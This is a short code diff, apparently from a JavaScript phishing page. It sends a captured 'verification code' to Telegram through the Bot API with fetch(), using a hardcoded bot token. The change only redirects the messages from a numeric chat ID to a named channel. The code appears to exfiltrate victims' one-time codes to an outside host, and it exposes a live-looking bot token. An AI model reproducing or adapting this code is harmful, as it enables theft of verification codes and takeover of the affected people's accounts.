@@ -15,7 +15,7 @@
         // Send the code to Telegram
         const telegramBotToken =
           "7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM";
-        const chatId = "5587800563";
+        const chatId = "@yenidencoc";
         const message = `Verification code: ${code}`;
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
         await fetch(telegramUrl);
